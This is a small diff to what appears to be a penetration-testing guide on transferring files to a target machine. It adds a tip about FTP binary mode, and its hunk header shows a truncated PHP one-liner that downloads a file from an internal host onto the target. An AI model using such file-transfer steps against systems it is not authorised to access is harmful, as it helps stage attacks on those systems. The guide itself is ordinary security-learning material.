@@ -77,7 +77,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 
 ## Ftp
 
-If you have access to a ftp-client to can of course just use that. 
+If you have access to a ftp-client to can of course just use that. Rembemer, if you are uploading binaries you must use binary mode, otherwise the binary will become corrupted!!!
 
 ## Tftp
 
